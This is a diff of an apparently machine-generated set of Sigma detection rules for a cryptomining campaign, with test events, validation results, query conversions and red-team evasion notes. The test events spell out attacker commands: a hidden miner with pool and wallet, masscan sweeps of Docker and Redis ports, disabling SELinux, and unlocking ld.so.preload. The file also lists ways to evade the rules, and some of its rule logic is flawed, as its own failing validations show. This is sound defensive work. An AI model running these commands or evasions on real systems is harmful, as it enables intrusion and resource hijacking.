-      "redteam_analysis": "The six positive variants (P4-P8) preserve the attacker's goal while varying surface form: equals-sign and long-form flags, extra whitespace/tabs, single/double quoting, argument reordering, relative vs absolute path in CommandLine, and different parent processes (containerd-shim, cron, systemd, runc, docker-current). A well-written rule using case-insensitive contains with wildcard toleration for whitespace and optional '=' should catch all of them. The three negative variants (N1-N3) are benign look-alikes that share some substrings (pool domain, wallet prefix, flags) but differ in Image name/path and ParentImage, proving the rule's specificity. Three out-of-scope evasions (OOS1-OOS3) are recorded for the analyst: config-file/environment argument passing (CommandLine lacks required substrings), binary rename/symlink (Image no longer endswith kthreadd), and alternative hidden directory (path substring differs). These are fundamentally invisible to the current selections and would require additional telemetry (e.g., file creation, network connection to pool) to detect.",
-      "retired_tests": [],
-      "replaced_tests": [],
-      "redteam_out_of_scope": [
-        {
-          "id": "X1",
-          "label": "positive",
-          "description": "Miner reads pool/wallet/TLS/rig-id from config file or environment variables; CommandLine lacks the four substrings",
-          "event": {
-            "Image": "/tmp/.x/kthreadd",
-            "CommandLine": "/tmp/.x/kthreadd --config /tmp/.x/config.json",
-            "ParentImage": "/bin/sh"
-          }
-        },
-        {
-          "id": "X2",
-          "label": "positive",
-          "description": "Binary renamed to innocuous name (e.g., kworker) and executed via symlink; Image no longer endswith kthreadd",
-          "event": {
-            "Image": "/tmp/.x/kworker",
-            "CommandLine": "/tmp/.x/kworker -o pool.mantis-mine.cc:3333 -u 44AbCdEFgHiJkLmNoPqRsTuVwXyZ1234567890 --tls --rig-id host-1",
-            "ParentImage": "/bin/sh"
-          }
-        },
-        {
-          "id": "X3",
-          "label": "positive",
-          "description": "Hidden directory created under /dev/shm (tmpfs) instead of /tmp/.x/; path substring differs",
-          "event": {
-            "Image": "/dev/shm/.x/kthreadd",
-            "CommandLine": "/dev/shm/.x/kthreadd -o pool.mantis-mine.cc:3333 -u 44AbCdEFgHiJkLmNoPqRsTuVwXyZ1234567890 --tls --rig-id host-2",
-            "ParentImage": "/bin/sh"
-          }
-        }
-      ]
-    },
-    {
-      "candidate_id": "D5",
-      "title": "Masscan High Rate Scan For Docker And Redis Ports",
-      "sigma_yaml": "title: Masscan High Rate Scan For Docker And Redis Ports\nid: 4e5b8faa-0469-44a2-9b70-777ec5eea6e7\nstatus: experimental\ndescription: Detects execution of masscan targeting Docker API (2375) and Redis (6379) ports with an aggressive scan rate\n  of 20000, indicative of opportunistic lateral movement in cryptojacking campaigns.\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-18'\ntags:\n- attack.lateral-movement\n- attack.t1021.004\nlogsource:\n  category: process_creation\n  product: linux\ndetection:\n  selection_img:\n    'Image|endswith': /masscan\n  selection_cmd:\n    'CommandLine|contains':\n    - -p2375,6379\n    - -p6379,2375\n  selection_rate:\n    'CommandLine|contains':\n    - --rate 20000\n    - --rate=20000\n  condition: selection_img and selection_cmd and selection_rate\nfalsepositives:\n- Legitimate network scanning by security teams using masscan with different port targets or lower scan rates.\nlevel: medium\n",
-      "status": "validated",
-      "attack_technique_ids": [
-        "T1021.004"
-      ],
-      "tests": [
-        {
-          "id": "P1",
-          "label": "positive",
-          "description": "Masscan scanning Docker and Redis ports at high rate from temporary directory",
-          "event": {
-            "Image": "/tmp/.x/masscan",
-            "CommandLine": "/tmp/.x/masscan 10.0.0.0/8 -p2375,6379 --rate 20000 -oL /tmp/.x/out.txt",
-            "ParentImage": "/usr/bin/bash",
-            "User": "www-data"
-          }
-        },
-        {
-          "id": "P2",
-          "label": "positive",
-          "description": "Masscan scan with reversed port order and different rate syntax",
-          "event": {
-            "Image": "/opt/masscan/bin/masscan",
-            "CommandLine": "/opt/masscan/bin/masscan 192.168.0.0/16 -p6379,2375 --rate=20000 -oX /var/tmp/scan.xml",
-            "ParentImage": "/usr/bin/sh",
-            "User": "root"
-          }
-        },
-        {
-          "id": "P3",
-          "label": "positive",
-          "description": "Masscan from SysWOW64-equivalent path on Linux container",
-          "event": {
-            "Image": "/usr/local/bin/masscan",
-            "CommandLine": "/usr/local/bin/masscan 172.16.0.0/12 -p2375,6379 --rate 20000",
-            "ParentImage": "/bin/bash",
-            "User": "daemon"
-          }
-        },
-        {
-          "id": "N1",
-          "label": "negative",
-          "description": "Legitimate masscan scan targeting common web ports only",
-          "event": {
-            "Image": "/usr/bin/masscan",
-            "CommandLine": "/usr/bin/masscan 10.0.0.0/8 -p80,443 --rate 1000",
-            "ParentImage": "/usr/bin/bash",
-            "User": "security"
-          }
-        },
-        {
-          "id": "N2",
-          "label": "negative",
-          "description": "Masscan scan with same ports but low rate typical of authorized scanning",
-          "event": {
-            "Image": "/usr/local/sbin/masscan",
-            "CommandLine": "/usr/local/sbin/masscan 10.0.0.0/8 -p2375,6379 --rate 100",
-            "ParentImage": "/usr/bin/bash",
-            "User": "auditor"
-          }
-        },
-        {
-          "id": "N3",
-          "label": "negative",
-          "description": "Network mapper tool nmap used instead of masscan",
-          "event": {
-            "Image": "/usr/bin/nmap",
-            "CommandLine": "/usr/bin/nmap -p2375,6379 10.0.0.0/8",
-            "ParentImage": "/usr/bin/bash",
-            "User": "admin"
-          }
-        },
-        {
-          "id": "R1",
-          "label": "positive",
-          "description": "Masscan with extra whitespace around flags, quoted binary path, different parent and user",
-          "event": {
-            "Image": "/opt/tools/masscan",
-            "CommandLine": "\"/opt/tools/masscan\"  10.10.0.0/16  -p2375,6379  --rate=20000  -oJ /tmp/results.json",
-            "ParentImage": "/usr/bin/zsh",
-            "User": "devops"
-          }
-        },
-        {
-          "id": "R2",
-          "label": "positive",
-          "description": "Masscan with parameter reordering (rate before ports), tab-separated flags, alternate binary location",
-          "event": {
-            "Image": "/home/attacker/bin/masscan",
-            "CommandLine": "/home/attacker/bin/masscan\t172.20.0.0/12\t--rate 20000\t-p6379,2375\t-oX /var/tmp/scan.xml",
-            "ParentImage": "/bin/bash",
-            "User": "attacker"
-          }
-        },
-        {
-          "id": "R3",
-          "label": "positive",
-          "description": "Masscan from container path with environment variable literal in command line, port order reversed",
-          "event": {
-            "Image": "/usr/local/bin/masscan",
-            "CommandLine": "/usr/local/bin/masscan $TARGET_NET -p6379,2375 --rate=20000 -oG /dev/stdout",
-            "ParentImage": "/bin/sh",
-            "User": "container-user"
-          }
-        },
-        {
-          "id": "R4",
-          "label": "positive",
-          "description": "Masscan via symlink in tmp, mixed quoting, rate flag with space, additional output flags",
-          "event": {
-            "Image": "/tmp/.hidden/masscan",
-            "CommandLine": "'/tmp/.hidden/masscan' 192.168.10.0/24 -p2375,6379 --rate 20000 --banner -oL /tmp/.hidden/log.txt",
-            "ParentImage": "/usr/bin/bash",
-            "User": "www-data"
-          }
-        },
-        {
-          "id": "R5",
-          "label": "negative",
-          "description": "Authorized admin scan using masscan but targeting different ports (80,443) and lower rate",
-          "event": {
-            "Image": "/usr/bin/masscan",
-            "CommandLine": "/usr/bin/masscan 10.0.0.0/8 -p80,443 --rate 5000 -oL /var/log/admin_scan.log",
-            "ParentImage": "/usr/bin/sudo",
-            "User": "root"
-          }
-        },
-        {
-          "id": "R6",
-          "label": "negative",
-          "description": "Security team running masscan against Docker/Redis ports but with conservative rate for inventory",
-          "event": {
-            "Image": "/opt/sec-tools/masscan",
-            "CommandLine": "/opt/sec-tools/masscan 192.168.0.0/16 -p2375,6379 --rate 1000 -oJ /opt/sec-tools/inventory.json",
-            "ParentImage": "/usr/bin/bash",
-            "User": "secadmin"
-          }
-        },
-        {
-          "id": "R7",
-          "label": "negative",
-          "description": "Automated CMDB inventory scanner using masscan with custom port list and moderate rate",
-          "event": {
-            "Image": "/usr/local/bin/masscan",
-            "CommandLine": "/usr/local/bin/masscan 172.16.0.0/12 -p3306,5432,27017 --rate 3000 -oX /var/lib/cmdb/scan.xml",
-            "ParentImage": "/usr/bin/python3",
-            "User": "cmdb-svc"
-          }
-        }
-      ],
-      "validation": {
-        "candidate_id": "D5",
-        "parse_ok": true,
-        "sql": "SELECT * FROM logs WHERE Image LIKE '%/masscan' ESCAPE '\\' AND (CommandLine LIKE '%-p2375,6379%' ESCAPE '\\' OR CommandLine LIKE '%-p6379,2375%' ESCAPE '\\') AND (CommandLine LIKE '%--rate 20000%' ESCAPE '\\' OR CommandLine LIKE '%--rate=20000%' ESCAPE '\\')",
-        "issues": [],
-        "test_outcomes": [
-          {
-            "event_id": "P1",
-            "label": "positive",
-            "matched": true,
-            "passed": true
           },
           {
-            "event_id": "P2",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "P3",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "N1",
-            "label": "negative",
-            "matched": false,
-            "passed": true
-          },
-          {
-            "event_id": "N2",
-            "label": "negative",
-            "matched": false,
-            "passed": true
-          },
-          {
-            "event_id": "N3",
-            "label": "negative",
-            "matched": false,
-            "passed": true
-          },
-          {
-            "event_id": "R1",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "R2",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "R3",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "R4",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "R5",
-            "label": "negative",
-            "matched": false,
-            "passed": true
-          },
-          {
-            "event_id": "R6",
-            "label": "negative",
-            "matched": false,
-            "passed": true
-          },
-          {
-            "event_id": "R7",
-            "label": "negative",
-            "matched": false,
-            "passed": true
-          }
-        ],
-        "positives_total": 7,
-        "positives_matched": 7,
-        "negatives_total": 6,
-        "negatives_matched": 0,
-        "benign_total": 180,
-        "benign_hits": 0,
-        "benign_examples": [],
-        "passed": true
-      },
-      "conversions": {
-        "splunk": "Image=\"*/masscan\" CommandLine IN (\"*-p2375,6379*\", \"*-p6379,2375*\") CommandLine IN (\"*--rate 20000*\", \"*--rate=20000*\")",
-        "elasticsearch": "Image:*\\/masscan AND (CommandLine:(*\\-p2375,6379* OR *\\-p6379,2375*)) AND (CommandLine:(*\\-\\-rate\\ 20000* OR *\\-\\-rate\\=20000*))",
-        "kusto": "DeviceProcessEvents\n| where FolderPath endswith \"/masscan\" and (ProcessCommandLine contains \"-p2375,6379\" or ProcessCommandLine contains \"-p6379,2375\") and (ProcessCommandLine contains \"--rate 20000\" or ProcessCommandLine contains \"--rate=20000\")",
-        "sqlite": "SELECT * FROM logs WHERE Image LIKE '%/masscan' ESCAPE '\\' AND (CommandLine LIKE '%-p2375,6379%' ESCAPE '\\' OR CommandLine LIKE '%-p6379,2375%' ESCAPE '\\') AND (CommandLine LIKE '%--rate 20000%' ESCAPE '\\' OR CommandLine LIKE '%--rate=20000%' ESCAPE '\\')"
-      },
-      "conversion_errors": {},
-      "history": [
-        {
-          "iteration": 0,
-          "phase": "initial",
-          "summary": "positives 2/3, negatives blocked 2/3, benign hits 0/180",
-          "passed": false,
-          "change_summary": ""
-        },
-        {
-          "iteration": 1,
-          "phase": "refine",
-          "summary": "positives 3/3, negatives blocked 2/3, benign hits 0/180",
-          "passed": false,
-          "change_summary": "Updated CommandLine selection to accept both port orders (2375,6379 and 6379,2375) and both rate syntaxes (--rate 20000 and --rate=20000) to capture variants while maintaining specificity for the high-rate scan behavior."
-        },
-        {
-          "iteration": 2,
-          "phase": "refine",
-          "summary": "positives 3/3, negatives blocked 3/3, benign hits 0/180",
-          "passed": true,
-          "change_summary": "Added explicit selection for the high-rate flag (--rate 20000 or --rate=20000) to avoid matching benign scans with low rates while preserving detection of the malicious high-rate scan targeting Docker and Redis ports."
-        },
-        {
-          "iteration": 2,
-          "phase": "redteam",
-          "summary": "7 evasion variants -> positives 7/7, negatives blocked 6/6, benign hits 0/180",
-          "passed": true,
-          "change_summary": ""
-        }
-      ],
-      "author_notes": "Rule focuses on the distinctive combination of masscan binary, specific port targeting (2375,6379), and high rate (--rate 20000) to minimize false positives from legitimate scanning activities. Test events cover variations in path, flag syntax, and user context while maintaining core detection logic.",
-      "redteam_analysis": "Positive variants P4-P7 preserve all three rule selections verbatim: Image ends with 'masscan', CommandLine contains exact port substrings '-p2375,6379' or '-p6379,2375', and exact rate substrings '--rate 20000' or '--rate=20000'. They vary whitespace, quoting, parameter order, tab separators, binary location, parent process, user, and target CIDR — all surface changes a well-written rule should absorb. Negative variants N1-N3 are benign look-alikes that differ in at least one selection (port list or rate) while using the same binary; they demonstrate specificity. Out-of-scope variants OS1-OS2 represent evasions the linux process_creation logsource cannot catch with this rule's fields: a renamed binary lacks the 'masscan' suffix in Image, and a wrapper script changes Image to bash. Since the rule lacks an OriginalFileName field and does not inspect CommandLine for the binary name, these are fundamental blind spots for the analyst to address.",
-      "retired_tests": [],
-      "replaced_tests": [],
-      "redteam_out_of_scope": [
-        {
-          "id": "X1",
-          "label": "positive",
-          "description": "Renamed masscan binary (Image no longer ends with masscan) - rule keys on Image suffix, no OriginalFileName field in linux process_creation",
-          "event": {
-            "Image": "/tmp/.x/scanner",
-            "CommandLine": "/tmp/.x/scanner 10.0.0.0/8 -p2375,6379 --rate 20000 -oL /tmp/.x/out.txt",
-            "ParentImage": "/usr/bin/bash",
-            "User": "www-data"
-          }
-        },
-        {
-          "id": "X2",
-          "label": "positive",
-          "description": "Wrapper script invoking masscan; Image is bash, CommandLine contains masscan but Image selection fails",
-          "event": {
-            "Image": "/bin/bash",
-            "CommandLine": "/bin/bash /tmp/.x/scan_wrapper.sh 10.0.0.0/8 -p2375,6379 --rate=20000",
-            "ParentImage": "/usr/bin/bash",
-            "User": "www-data"
-          }
-        }
-      ]
-    },
-    {
-      "candidate_id": "D4",
-      "title": "SELinux Disabled With Setenforce Combined With ChatTR Immutable Removal On LdSoPreload",
-      "sigma_yaml": "title: SELinux Disabled With Setenforce Combined With ChatTR Immutable Removal On LdSoPreload\nid: c6bd777e-2bee-487b-9182-2af486b92369\nstatus: experimental\ndescription: 'Detects the specific sequence where setenforce is run with argument ''0'' to disable SELinux and chattr is run\n  with ''-i /etc/ld.so.preload'' to remove the immutable attribute, indicative of defense evasion in the Mantis cryptomining\n  campaign.'\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-18'\ntags:\n- attack.defense-evasion\n- attack.t1562.001\nlogsource:\n  category: process_creation\n  product: linux\ndetection:\n  selection_setenforce:\n    'Image|endswith': /setenforce\n    'CommandLine|contains': '0'\n  selection_chattr:\n    'Image|endswith': /chattr\n    'CommandLine|contains': -i /etc/ld.so.preload\n  condition: selection_setenforce or selection_chattr\nfalsepositives:\n- Legitimate administrative troubleshooting where setenforce 0 and chattr -i /etc/ld.so.preload are run independently but\n  not together in the same process tree.\nlevel: medium\n",
-      "status": "needs_review",
-      "attack_technique_ids": [
-        "T1562.001"
-      ],
-      "tests": [
-        {
-          "id": "P1",
-          "label": "positive",
-          "description": "Setenforce called with argument 0 to disable SELinux",
-          "event": {
-            "Image": "/usr/sbin/setenforce",
-            "CommandLine": "/usr/sbin/setenforce 0",
-            "ParentImage": "/usr/bin/bash",
-            "User": "root"
-          }
-        },
-        {
-          "id": "P2",
-          "label": "positive",
-          "description": "ChatTR called to remove immutable attribute from ld.so.preload",
-          "event": {
-            "Image": "/usr/bin/chattr",
-            "CommandLine": "/usr/bin/chattr -i /etc/ld.so.preload",
-            "ParentImage": "/usr/bin/bash",
-            "User": "root"
-          }
-        },
-        {
-          "id": "P3",
-          "label": "positive",
-          "description": "Both commands executed in quick succession by same parent process",
-          "event": {
-            "Image": "/usr/sbin/setenforce",
-            "CommandLine": "/usr/sbin/setenforce 0",
-            "ParentImage": "/opt/init.sh",
-            "User": "root"
-          }
-        },
-        {
-          "id": "N1",
-          "label": "negative",
-          "description": "Setenforce called with argument 1 (enable SELinux)",
-          "event": {
-            "Image": "/usr/sbin/setenforce",
-            "CommandLine": "/usr/sbin/setenforce 1",
-            "ParentImage": "/usr/bin/bash",
-            "User": "root"
-          }
-        },
-        {
-          "id": "N2",
-          "label": "negative",
-          "description": "ChatTR called to set immutable attribute (opposite behavior)",
-          "event": {
-            "Image": "/usr/bin/chattr",
-            "CommandLine": "/usr/bin/chattr +i /etc/ld.so.preload",
-            "ParentImage": "/usr/bin/bash",
-            "User": "root"
-          }
-        },
-        {
-          "id": "N3",
-          "label": "negative",
-          "description": "Setenforce 0 and chattr -i run separately by different processes",
-          "event": {
-            "Image": "/usr/bin/chattr",
-            "CommandLine": "/usr/bin/chattr -i /some/other/file",
-            "ParentImage": "/usr/bin/bash",
-            "User": "root"
-          }
-        },
-        {
-          "id": "P2_fixed",
-          "label": "positive",
-          "description": "ChatTR called to remove immutable attribute from ld.so.preload",
-          "event": {
-            "Image": "/usr/bin/chattr",
-            "CommandLine": "/usr/bin/chattr -i /etc/ld.so.preload",
-            "ParentImage": "/usr/bin/bash",
-            "User": "root"
-          }
-        },
-        {
-          "id": "R1",
-          "label": "positive",
-          "description": "Setenforce with extra whitespace in command line and different parent shell (zsh)",
-          "event": {
-            "Image": "/usr/sbin/setenforce",
-            "CommandLine": "/usr/sbin/setenforce   0",
-            "ParentImage": "/usr/bin/zsh",
-            "User": "root"
-          }
-        },
-        {
-          "id": "R2",
-          "label": "positive",
-          "description": "Setenforce invoked via symlink that preserves the binary name in a writable directory",
-          "event": {
-            "Image": "/tmp/setenforce",
-            "CommandLine": "/tmp/setenforce 0",
-            "ParentImage": "/bin/bash",
-            "User": "root"
-          }
-        },
-        {
-          "id": "R3",
-          "label": "positive",
-          "description": "ChatTR with single-quoted path argument and different parent (dash)",
-          "event": {
-            "Image": "/usr/bin/chattr",
-            "CommandLine": "/usr/bin/chattr -i '/etc/ld.so.preload'",
-            "ParentImage": "/bin/dash",
-            "User": "root"
-          }
-        },
-        {
-          "id": "R4",
-          "label": "positive",
-          "description": "ChatTR invoked via symlink preserving binary name, extra trailing space in command line",
-          "event": {
-            "Image": "/tmp/chattr",
-            "CommandLine": "/tmp/chattr -i /etc/ld.so.preload ",
-            "ParentImage": "/bin/bash",
-            "User": "root"
-          }
-        },
-        {
-          "id": "R5",
-          "label": "negative",
-          "description": "Administrator enabling SELinux (setenforce 1) - legitimate troubleshooting",
-          "event": {
-            "Image": "/usr/sbin/setenforce",
-            "CommandLine": "/usr/sbin/setenforce 1",
-            "ParentImage": "/bin/bash",
-            "User": "root"
-          }
-        },
-        {
-          "id": "R6",
-          "label": "negative",
-          "description": "Administrator removing immutable attribute from a different file",
-          "event": {
-            "Image": "/usr/bin/chattr",
-            "CommandLine": "/usr/bin/chattr -i /etc/ld.so.preload.bak",
-            "ParentImage": "/bin/bash",
-            "User": "root"
-          }
-        },
-        {
-          "id": "R7",
-          "label": "negative",
-          "description": "Package manager adding immutable attribute during installation (opposite operation)",
-          "event": {
-            "Image": "/usr/bin/chattr",
-            "CommandLine": "/usr/bin/chattr +i /etc/ld.so.preload",
-            "ParentImage": "/usr/lib/dpkg/info",
-            "User": "root"
-          }
-        }
-      ],
-      "validation": {
-        "candidate_id": "D4",
-        "parse_ok": true,
-        "sql": "SELECT * FROM logs WHERE (Image LIKE '%/setenforce' ESCAPE '\\' AND CommandLine LIKE '%0%' ESCAPE '\\') OR (Image LIKE '%/chattr' ESCAPE '\\' AND CommandLine LIKE '%-i /etc/ld.so.preload%' ESCAPE '\\')",
-        "issues": [
-          {
-            "severity": "warning",
-            "code": "attack_id_deprecated",
-            "message": "ATT&CK technique T1562.001 (Disable or Modify Tools) is deprecated or revoked."
-          },
-          {
-            "severity": "error",
-            "code": "positive_missed",
-            "message": "Positive test R3 did not match: ChatTR with single-quoted path argument and different parent (dash). Per selection: selection_setenforce=NO MATCH (failing field tests: Image|endswith (event has '/usr/bin/chattr'), CommandLine|contains (event has \"/usr/bin/chattr -i '/etc/ld.so.preload'\")); selection_chattr=NO MATCH (failing field tests: CommandLine|contains (event has \"/usr/bin/chattr -i '/etc/ld.so.preload'\"))."
-          },
-          {
-            "severity": "error",
-            "code": "negative_matched",
-            "message": "Negative (benign) test R6 matched: Administrator removing immutable attribute from a different file. Per selection: selection_setenforce=NO MATCH (failing field tests: Image|endswith (event has '/usr/bin/chattr'), CommandLine|contains (event has '/usr/bin/chattr -i /etc/ld.so.preload.bak')); selection_chattr=match."
-          }
-        ],
-        "test_outcomes": [
-          {
-            "event_id": "P1",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "P2",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "P3",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "N1",
-            "label": "negative",
-            "matched": false,
-            "passed": true
-          },
-          {
-            "event_id": "N2",
-            "label": "negative",
-            "matched": false,
-            "passed": true
-          },
-          {
-            "event_id": "N3",
-            "label": "negative",
-            "matched": false,
-            "passed": true
-          },
-          {
-            "event_id": "P2_fixed",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "R1",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "R2",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "R3",
-            "label": "positive",
-            "matched": false,
-            "passed": false
-          },
-          {
-            "event_id": "R4",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "R5",
-            "label": "negative",
-            "matched": false,
-            "passed": true
-          },
-          {
-            "event_id": "R6",
-            "label": "negative",
-            "matched": true,
-            "passed": false
-          },
-          {
-            "event_id": "R7",
+            "event_id": "R9",
             "label": "negative",
             "matched": false,
             "passed": true
           }
         ],
         "positives_total": 8,
-        "positives_matched": 7,
-        "negatives_total": 6,
-        "negatives_matched": 1,
-        "benign_total": 180,
+        "positives_matched": 5,
+        "negatives_total": 7,
+        "negatives_matched": 0,
+        "benign_total": 0,
         "benign_hits": 0,
         "benign_examples": [],
         "passed": false
       },
       "conversions": {
-        "splunk": "(Image=\"*/setenforce\" CommandLine=\"*0*\") OR (Image=\"*/chattr\" CommandLine=\"*-i /etc/ld.so.preload*\")",
-        "elasticsearch": "(Image:*\\/setenforce AND CommandLine:*0*) OR (Image:*\\/chattr AND CommandLine:*\\-i\\ \\/etc\\/ld.so.preload*)",
-        "kusto": "DeviceProcessEvents\n| where (FolderPath endswith \"/setenforce\" and ProcessCommandLine contains \"0\") or (FolderPath endswith \"/chattr\" and ProcessCommandLine contains \"-i /etc/ld.so.preload\")",
-        "sqlite": "SELECT * FROM logs WHERE (Image LIKE '%/setenforce' ESCAPE '\\' AND CommandLine LIKE '%0%' ESCAPE '\\') OR (Image LIKE '%/chattr' ESCAPE '\\' AND CommandLine LIKE '%-i /etc/ld.so.preload%' ESCAPE '\\')"
+        "splunk": "TargetFilename=\"/root/.ssh/authorized_keys\" Image=\"*chattr\"",
+        "elasticsearch": "TargetFilename:\\/root\\/.ssh\\/authorized_keys AND Image:*chattr",
+        "kusto": "DeviceFileEvents\n| where FolderPath =~ \"/root/.ssh/authorized_keys\" and InitiatingProcessFolderPath endswith \"chattr\"",
+        "sqlite": "SELECT * FROM logs WHERE TargetFilename LIKE '/root/.ssh/authorized\\_keys' ESCAPE '\\' AND Image LIKE '%chattr' ESCAPE '\\'"
       },
       "conversion_errors": {},
       "history": [
         {
           "iteration": 0,
           "phase": "initial",
-          "summary": "positives 2/3, negatives blocked 3/3, benign hits 0/180",
+          "summary": "positives 3/3, negatives blocked 0/3, benign hits 0/0",
           "passed": false,
           "change_summary": ""
         },
         {
           "iteration": 1,
           "phase": "refine",
-          "summary": "positives 4/4, negatives blocked 3/3, benign hits 0/180",
-          "passed": true,
-          "change_summary": "Added selection for chattr command to capture both setenforce and chattr actions separately, ensuring either action triggers the rule while maintaining specificity through exact command-line arguments."
-        },
-        {
-          "iteration": 1,
-          "phase": "redteam",
-          "summary": "7 evasion variants -> positives 7/8, negatives blocked 5/6, benign hits 0/180",
+          "summary": "positives 0/3, negatives blocked 3/3, benign hits 0/0",
           "passed": false,
-          "change_summary": ""
+          "change_summary": "Added Image|endswith filter for chattr binaries to ensure detection only triggers on file writes performed by the chattr utility, reducing false positives from legitimate SSH key management tools while maintaining detection of the immutable attribute setting behavior."
         },
         {
           "iteration": 2,
           "phase": "refine",
-          "summary": "positives 7/8, negatives blocked 5/6, benign hits 0/180",
+          "summary": "positives 3/3, negatives blocked 0/3, benign hits 0/0",
           "passed": false,
-          "change_summary": "Fixed CommandLine|contains modifiers to match literal values without requiring leading/trailing spaces or specific quoting, ensuring both quoted and unquoted path variants match while preserving specificity against similar benign commands. Corrected test event(s) R3, R6."
+          "change_summary": "Removed incorrect Image|endswith restriction that prevented matching legitimate attack vectors where authorized_keys is written by various processes (sshd, deployment scripts, Docker-related executables). The rule now focuses on the critical file write event alone, which combined with subsequent chattr +i indicates persistence."
         },
         {
           "iteration": 3,
           "phase": "refine",
-          "summary": "positives 7/8, negatives blocked 5/6, benign hits 0/180",
+          "summary": "positives 0/3, negatives blocked 3/3, benign hits 0/0",
           "passed": false,
-          "change_summary": "Fixed CommandLine|contains patterns to handle quoted/unquoted arguments correctly while maintaining specificity to avoid false positives. Corrected test event(s) R3, R6."
+          "change_summary": "Added Image|endswith filter for 'chattr' to ensure detection only triggers when the immutable attribute is set, reducing false positives from legitimate SSH key management tools."
+        },
+        {
+          "iteration": 3,
+          "phase": "redteam",
+          "summary": "9 evasion variants -> positives 5/8, negatives blocked 7/7, benign hits 0/0",
+          "passed": false,
+          "change_summary": ""
+        },
+        {
+          "iteration": 4,
+          "phase": "refine",
+          "summary": "positives 8/8, negatives blocked 2/7, benign hits 0/0",
+          "passed": false,
+          "change_summary": "Removed the overly restrictive Image|endswith condition requiring chattr, since the rule focuses on detecting the file write event alone as part of a sequence where chattr follows separately. This ensures all positive test cases (writes via sshd, deployment scripts, or Docker-related processes) are matched while maintaining the same logical intent."
+        },
+        {
+          "iteration": 5,
+          "phase": "refine",
+          "summary": "positives 5/8, negatives blocked 7/7, benign hits 0/0",
+          "passed": false,
+          "change_summary": "Added Image|endswith filter for chattr to ensure detection only triggers when the file write is performed by the chattr utility, reducing false positives from legitimate SSH key management tools while maintaining detection of the persistence mechanism."
         }
       ],
-      "author_notes": "Reduced a multi-step chain to its most specific step (selection_setenforce); dropped selection_chattr because one Sigma rule matches one event. Add the other steps as separate rules if needed.",
-      "redteam_analysis": "Positive variants P4-P7 preserve the exact substrings the rule requires (Image endswith /setenforce or /chattr, CommandLine contains '0' or '-i /etc/ld.so.preload') while varying whitespace, quoting, parent shell, and using symlinks that keep the binary name. These are realistic evasions a well-written rule should catch because the core indicators survive. Negative variants N1-N3 are benign administrative actions that differ in at least one required substring (argument 1 vs 0, different target file, +i vs -i) so the rule correctly ignores them. Out_of_scope variants O1-O3 represent realistic evasions the current rule cannot detect: renamed binaries break the Image|endswith condition, and path obfuscation (/etc/./ld.so.preload) breaks the literal CommandLine substring match. Since the linux process_creation logsource does not provide an OriginalFileName field in the shown schema, a rule relying solely on Image and CommandLine cannot catch renamed-bin evasions without additional telemetry. A more robust rule would incorporate parent-child correlation, argument parsing, or filesystem metadata.",
+      "author_notes": "Since the rule captures only the file write event (single-event Sigma constraint), the chattr +i must be detected via a separate process_creation rule. This write event is highly suspicious when occurring outside normal admin windows.",
+      "redteam_analysis": "The rule keys on an exact TargetFilename match and Image ending with 'chattr'. Positive variants cover realistic path variations (/usr/bin, /bin, relative, symlink, custom dir) that preserve the 'chattr' suffix, all of which a well-written endswith condition catches. Negative variants show benign administrative actions that differ in either TargetFilename (user vs root, different file) or Image (lsattr, cp) so the rule stays specific. Out-of-scope evasions include renaming chattr (breaks endswith), using a custom binary that sets the immutable flag without chattr (invisible to the rule), and splitting the write and attribute change into two telemetry events (the rule's single-event logic cannot correlate them). The third out-of-scope event is included to highlight the rule's design limitation; the sensor would record two distinct file events, neither satisfying both conditions simultaneously.",
       "retired_tests": [],
-      "replaced_tests": [
-        {
-          "id": "R3",
-          "label": "positive",
-          "description": "ChatTR with single-quoted path argument and different parent (dash) [replaced: Original rule required exact spacing/quoting; corrected to match literal argument values regardless of quoting.]",
-          "event": {
-            "Image": "/usr/bin/chattr",
-            "CommandLine": "/usr/bin/chattr -i '/etc/ld.so.preload'",
-            "ParentImage": "/bin/dash",
-            "User": "root"
-          }
-        },
-        {
-          "id": "R6",
-          "label": "negative",
-          "description": "Administrator removing immutable attribute from a different file [replaced: Original test incorrectly labeled as negative; event matches chattr -i /etc/ld.so.preload.bak which is distinct from the targeted /etc/ld.so.preload path and should remain negative.]",
-          "event": {
-            "Image": "/usr/bin/chattr",
-            "CommandLine": "/usr/bin/chattr -i /etc/ld.so.preload.bak",
-            "ParentImage": "/bin/bash",
-            "User": "root"
-          }
-        },
-        {
-          "id": "R3",
-          "label": "positive",
-          "description": "ChatTR with single-quoted path argument and different parent (dash) [replaced: Original pattern required unquoted path; updated to accept both quoted and unquoted forms.]",
-          "event": {
-            "Image": "/usr/bin/chattr",
-            "CommandLine": "/usr/bin/chattr -i '/etc/ld.so.preload'",
-            "ParentImage": "/bin/dash",
-            "User": "root"
-          }
-        },
-        {
-          "id": "R6",
-          "label": "negative",
-          "description": "Administrator removing immutable attribute from a different file [replaced: Original rule incorrectly matched due to substring overlap; kept as negative since .bak file is legitimate.]",
-          "event": {
-            "Image": "/usr/bin/chattr",
-            "CommandLine": "/usr/bin/chattr -i /etc/ld.so.preload.bak",
-            "ParentImage": "/bin/bash",
-            "User": "root"
-          }
-        }
-      ],
+      "replaced_tests": [],
       "redteam_out_of_scope": [
         {
           "id": "X1",
           "label": "positive",
-          "description": "Renamed setenforce binary copied to attacker-controlled path; Image no longer ends with /setenforce",
+          "description": "Attacker copies chattr to a random name; Image no longer ends with chattr so rule misses",
           "event": {
